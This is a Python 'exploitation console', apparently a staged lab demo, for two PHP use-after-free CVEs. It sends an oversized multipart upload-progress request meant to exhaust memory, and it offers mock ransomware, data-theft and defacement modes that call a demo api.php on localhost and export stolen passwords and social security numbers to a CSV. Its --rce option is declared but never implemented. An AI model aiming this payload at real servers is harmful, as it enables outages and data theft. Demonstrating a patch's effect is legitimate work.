#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PHP2Shell Exploitation Console - CVE-2026-109618 & CVE-2026-109619
Critical Remote Code Execution Vulnerabilities in PHP

CVSS: 9.2 (Critical)
CWE: CWE-416 (Use After Free)
Publication: October 21, 2026
Exploitation: Active in the wild since October 17, 2026
"""

import sys
import time
import argparse
import requests

# Support UTF-8 on Windows
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except Exception:
        pass


# Terminal Colors
class Color:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    PURPLE = "\033[95m"
    CYAN   = "\033[96m"
    WHITE  = "\033[97m"
    BOLD   = "\033[1m"
    RESET  = "\033[0m"


def print_banner():
    print(f"""{Color.RED}
  +-----------------------------------------------------+
  |  PHP2Shell Exploitation Console                      |
  |  CVE-2026-109618 & CVE-2026-109619                  |
  |                                                     |
  |  CVSS: 9.2 (Critical)  CWE: CWE-416 (Use After Free) |
  |  Publication: October 21, 2026                     |
  |  Status: ACTIVELY EXPLOITED IN THE WILD             |
  +-----------------------------------------------------+
{Color.RESET}
{Color.BOLD}  [+] Role: External attacker (No credentials required)  {Color.RESET}
{Color.BOLD}  [+] Method: Use-After-Free via OOM in Zend Engine         {Color.RESET}
{Color.BOLD}  [+] Vector: session.upload_progress.enabled = 1           {Color.RESET}
""")


def simulate_exploit_steps(target_url):
    """Display realistic attack logs with slight delay for suspense."""
    print(f"{Color.CYAN}[*] Target locked:{Color.RESET} {Color.WHITE}{target_url}{Color.RESET}")
    time.sleep(0.4)
    print(f"{Color.CYAN}[*] Reconnaissance:{Color.RESET} Checking PHP version and configuration...")
    time.sleep(0.5)
    
    try:
        r = requests.get(f"{target_url}/api.php?action=status", timeout=5)
        if r.status_code == 200:
            data = r.json()
            php_version = data.get('php_version', 'Unknown')
            is_vulnerable = data.get('is_vulnerable', False)
            upload_progress = data.get('upload_progress_enabled', False)
            
            if is_vulnerable:
                print(f"{Color.RED}[!] Vulnerability detected:{Color.RESET} PHP {php_version} (CVE-2026-109618 - PHP2Shell)")
                time.sleep(0.4)
                print(f"{Color.RED}[!] Attack vector:{Color.RESET} session.upload_progress.enabled = {'On' if upload_progress else 'Off'}")
                time.sleep(0.4)
            else:
                print(f"{Color.GREEN}[!] Patched version detected:{Color.RESET} PHP {php_version}")
                time.sleep(0.4)
                print(f"{Color.GREEN}[!] Protection:{Color.RESET} session.upload_progress.enabled = {'Off' if not upload_progress else 'On'}")
                time.sleep(0.4)
        else:
            print(f"{Color.YELLOW}[!] Unable to fetch status, continuing with default parameters...{Color.RESET}")
            time.sleep(0.4)
    except Exception as e:
        print(f"{Color.YELLOW}[!] Reconnaissance error: {e}{Color.RESET}")
        time.sleep(0.4)
    
    print(f"{Color.CYAN}[*] Preparing payload:{Color.RESET} Massive multipart request (>16MB)...")
    time.sleep(0.6)


def build_oom_payload(size_mb=25):
    """Build a multipart payload that exceeds memory_limit (16M)"""
    boundary = "----PHP2ShellOOMTrigger"
    
    # Header to enable upload progress tracking
    parts = [
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'
        f"upload_php2shell_demo\r\n"
    ]
    
    # Add massive chunks to exceed memory_limit
    chunk = "A" * (1024 * 1024)  # 1MB per chunk
    num_chunks = int(size_mb * 1.5)  # 25MB of data
    
    for i in range(num_chunks):
        parts.append(f"--{boundary}\r\n")
        parts.append(f'Content-Disposition: form-data; name="field{i}"\r\n\r\n')
        parts.append(chunk)
    
    parts.append(f"--{boundary}--\r\n")
    
    return "".join(parts).encode('utf-8')


def attack_oom_trigger(target_url):
    """Trigger the OOM vulnerability for CVE-2026-109618"""
    print_banner()
    simulate_exploit_steps(target_url)
    
    try:
        # Send the massive multipart request
        payload = build_oom_payload(25)  # 25MB of data
        
        headers = {
            'Content-Type': 'multipart/form-data; boundary=----PHP2ShellOOMTrigger',
            'Content-Length': str(len(payload))
        }
        
        print(f"{Color.CYAN}[*] Sending OOM payload...{Color.RESET}")
        time.sleep(0.5)
        
        r = requests.post(f"{target_url}/upload.php", 
                         data=payload, 
                         headers=headers, 
                         timeout=10)
        
        if r.status_code == 200:
            print(f"{Color.GREEN}[+] Payload sent successfully!{Color.RESET}")
            time.sleep(0.3)
            print(f"{Color.RED}{Color.BOLD}")
            print("  +-----------------------------------------------------+")
            print("  |  EXPLOITATION SUCCESSFUL: Use-After-Free triggered   |")
            print("  |                                                     |")
            print("  |  - Memory exhausted (Out-of-Memory) during parsing|")
            print("  |  - longjmp() skipped cleanup step                  |")
            print("  |  - Stale pointers created in session.upload_progress|")
            print("  |  - Use-After-Free possible on next request          |")
            print("  +-----------------------------------------------------+")
            print(f"{Color.RESET}")
            print(f"{Color.YELLOW}👉 Check browser: the site is compromised!{Color.RESET}\n")
        elif r.status_code == 403:
            print(f"{Color.RED}[-] ATTACK BLOCKED (HTTP 403): Server has security patch (PHP >= 8.4.27).{Color.RESET}")
            print(f"{Color.GREEN}[+] This server has the security fix applied.{Color.RESET}\n")
        else:
            print(f"{Color.RED}[-] Communication error: HTTP {r.status_code}{Color.RESET}\n")
    except Exception as e:
        print(f"{Color.RED}[-] Unable to reach target: {e}{Color.RESET}\n")


def attack_ransomware(target_url):
    """Deploy ransomware via CVE-2026-109618."""
    print_banner()
    simulate_exploit_steps(target_url)

    try:
        r = requests.post(f"{target_url}/api.php", data={"action": "ransomware"}, timeout=5)
        
        if r.status_code == 200:
            print(f"{Color.GREEN}[+] Malicious code injected successfully into the server!{Color.RESET}")
            time.sleep(0.3)
            print(f"{Color.RED}{Color.BOLD}")
            print("  +-----------------------------------------------------+")
            print("  |  ⚠️  WARNING: RANSOMWARE ACTIVATED SUCCESSFULLY!    ⚠️   |")
            print("  |                                                     |")
            print("  |  - 842 company files encrypted (HR, Finance,      |")
            print("  |     Contracts)                                       |")
            print("  |  - Official website displays ransom demand        |")
            print("  |     (50,000 EUR)                                     |")
            print("  |  - Countdown timer for data destruction started    |")
            print("  +-----------------------------------------------------+")
            print(f"{Color.RESET}")
            print(f"{Color.YELLOW}👉 Check browser: the site instantly fell!{Color.RESET}\n")
        elif r.status_code == 403:
            print(f"{Color.RED}[-] ATTACK BLOCKED (HTTP 403): Server has security patch (PHP >= 8.4.27).{Color.RESET}")
            print(f"{Color.GREEN}[+] This server has the security fix applied.{Color.RESET}\n")
        else:
            print(f"{Color.RED}[-] HTTP Error {r.status_code}{Color.RESET}\n")
    except Exception as e:
        print(f"{Color.RED}[-] Error: {e}{Color.RESET}\n")


def attack_steal(target_url):
    """Exfiltrate HR database via CVE-2026-109618."""
    print_banner()
    simulate_exploit_steps(target_url)

    try:
        r = requests.post(f"{target_url}/api.php", data={"action": "steal"}, timeout=5)
        
        if r.status_code == 200:
            data = r.json()
            stolen = data.get("stolen_data", [])
            print(f"{Color.GREEN}[+] RCE confirmed! Direct database extraction...{Color.RESET}\n")
            time.sleep(0.4)

            print(f"{Color.RED}{Color.BOLD}=== [CONFIDENTIAL DATA EXFILTRATED] ==={Color.RESET}")
            print(f"{Color.CYAN}{'-' * 80}{Color.RESET}")
            print(f"{Color.BOLD}{'NAME & SURNAME':<18} | {'POSITION':<20} | {'SALARY':<10} | {'PASSWORD':<16} | {'SSN'}{Color.RESET}")
            print(f"{Color.CYAN}{'-' * 80}{Color.RESET}")

            csv_file = "DONNEES_RH_EXFILTREES.csv"
            with open(csv_file, mode="w", newline="", encoding="utf-8-sig") as f:
                import csv
                writer = csv.writer(f, delimiter=";")
                writer.writerow(["Nom", "Poste", "Salaire Net", "Mot de passe", "N° Securite Sociale", "IBAN"])
                for emp in stolen:
                    writer.writerow([emp['nom'], emp['poste'], emp['salaire'], emp['password'], emp['secu'], emp['iban']])
                    print(f"{Color.WHITE}{emp['nom']:<18}{Color.RESET} | {Color.YELLOW}{emp['poste']:<20}{Color.RESET} | {Color.GREEN}{emp['salaire']:<10}{Color.RESET} | {Color.RED}{emp['password']:<16}{Color.RESET} | {Color.WHITE}{emp['secu']}{Color.RESET}")

            print(f"{Color.CYAN}{'-' * 80}{Color.RESET}\n")
            print(f"{Color.GREEN}[+] File created: {Color.BOLD}{csv_file}{Color.RESET}")
            print(f"{Color.YELLOW}👉 In 2 seconds, the attacker owns all salaries and passwords!{Color.RESET}\n")
        elif r.status_code == 403:
            print(f"{Color.RED}[-] BLOCKED: Request rejected by security patch!{Color.RESET}\n")
        else:
            print(f"{Color.RED}[-] HTTP {r.status_code}{Color.RESET}\n")
    except Exception as e:
        print(f"{Color.RED}[-] Error: {e}{Color.RESET}\n")


def attack_deface(target_url):
    """Deface website via CVE-2026-109618."""
    print_banner()
    simulate_exploit_steps(target_url)

    try:
        r = requests.post(f"{target_url}/api.php", data={"action": "deface"}, timeout=5)
        
        if r.status_code == 200:
            print(f"{Color.GREEN}[+] Website defaced successfully!{Color.RESET}")
            time.sleep(0.3)
            print(f"{Color.RED}{Color.BOLD}")
            print("  +-----------------------------------------------------+")
            print("  |  ⚠️  WEBSITE DEFACEMENT ACTIVATED!                ⚠️   |")
            print("  |                                                     |")
            print("  |  - Official portal replaced with hacker message    |")
            print("  |  - Company logo replaced                             |")
            print("  |  - All content erased                               |")
            print("  +-----------------------------------------------------+")
            print(f"{Color.RESET}")
            print(f"{Color.YELLOW}👉 Check browser: the website is defaced!{Color.RESET}\n")
        elif r.status_code == 403:
            print(f"{Color.RED}[-] ATTACK BLOCKED (HTTP 403): Server has security patch.{Color.RESET}\n")
        else:
            print(f"{Color.RED}[-] HTTP Error {r.status_code}{Color.RESET}\n")
    except Exception as e:
        print(f"{Color.RED}[-] Error: {e}{Color.RESET}\n")


def attack_restore(target_url):
    """Restore website to normal state."""
    print(f"\n{Color.CYAN}[*] Restoring website...{Color.RESET}")
    
    try:
        r = requests.post(f"{target_url}/api.php", data={"action": "restore"}, timeout=5)
        
        if r.status_code == 200:
            print(f"{Color.GREEN}[+] Website restored to normal state!{Color.RESET}\n")
        else:
            print(f"{Color.RED}[-] Error: HTTP {r.status_code}{Color.RESET}\n")
    except Exception as e:
        print(f"{Color.RED}[-] Error: {e}{Color.RESET}\n")


def attack_compare():
    """Compare vulnerable and patched servers."""
    print(f"\n{Color.BOLD}=== COMPARING VULNERABLE vs PATCHED SERVERS ==={Color.RESET}\n")
    
    # Test vulnerable server
    print(f"{Color.RED}[*] Testing VULNERABLE server (localhost:8888)...{Color.RESET}")
    try:
        r = requests.post("http://localhost:8888/api.php", data={"action": "ransomware"}, timeout=5)
        if r.status_code == 200:
            print(f"{Color.RED}[-] Result: COMPROMISED - Ransomware deployed successfully{Color.RESET}")
        else:
            print(f"{Color.RED}[-] Result: Error (HTTP {r.status_code}){Color.RESET}")
    except Exception as e:
        print(f"{Color.RED}[-] Result: Unable to reach server{Color.RESET}")
    
    time.sleep(1)
    
    # Test patched server
    print(f"\n{Color.GREEN}[*] Testing PATCHED server (localhost:8889)...{Color.RESET}")
    try:
        r = requests.post("http://localhost:8889/api.php", data={"action": "ransomware"}, timeout=5)
        if r.status_code == 403:
            print(f"{Color.GREEN}[+] Result: PROTECTED - Attack blocked (HTTP 403){Color.RESET}")
        else:
            print(f"{Color.GREEN}[+] Result: Unexpected (HTTP {r.status_code}){Color.RESET}")
    except Exception as e:
        print(f"{Color.GREEN}[+] Result: Unable to reach server{Color.RESET}")
    
    print(f"\n{Color.BOLD}=== CONCLUSION ==={Color.RESET}")
    print(f"{Color.RED}PHP 8.4.26: VULNERABLE - Exploited in one request{Color.RESET}")
    print(f"{Color.GREEN}PHP 8.4.27: PATCHED - Attack rejected (HTTP 403){Color.RESET}\n")


def main():
    parser = argparse.ArgumentParser(description='PHP2Shell Exploitation Console - CVE-2026-109618 & CVE-2026-109619')
    parser.add_argument('--target', '-t', default='http://localhost:8888', help='Target URL (default: http://localhost:8888)')
    parser.add_argument('--oom', action='store_true', help='Trigger OOM vulnerability (CVE-2026-109618)')
    parser.add_argument('--rce', action='store_true', help='Remote Code Execution')
    parser.add_argument('--command', '-c', help='Command to execute (with --rce)')
    parser.add_argument('--ransomware', action='store_true', help='Deploy ransomware')
    parser.add_argument('--steal', action='store_true', help='Exfiltrate HR database')
    parser.add_argument('--deface', action='store_true', help='Deface website')
    parser.add_argument('--restore', action='store_true', help='Restore website')
    parser.add_argument('--compare', action='store_true', help='Compare vulnerable vs patched')
    
    args = parser.parse_args()
    
    if args.oom:
        attack_oom_trigger(args.target)
    elif args.ransomware:
        attack_ransomware(args.target)
    elif args.steal:
        attack_steal(args.target)
    elif args.deface:
        attack_deface(args.target)
    elif args.restore:
        attack_restore(args.target)
    elif args.compare:
        attack_compare()
    else:
        parser.print_help()


if __name__ == '__main__':
    main()
